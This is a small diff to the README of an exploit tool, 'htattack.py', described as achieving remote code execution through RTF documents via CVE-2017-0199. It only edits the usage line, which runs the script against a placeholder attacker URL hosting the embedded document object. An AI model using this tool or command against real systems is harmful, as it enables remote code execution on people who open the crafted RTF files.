@@ -6,4 +6,4 @@ An exploit implementation for RCE in RTF docs (CVE-2017-0199).
 
 ### Usage:
 
-    # python htattack.py -u <http://[attacker-url]/document.doc> (this has to be the document object embedded in the RTF)
+    python htattack.py -u <http://[attacker-url]/document.doc> (this has to be the document object embedded in the RTF)
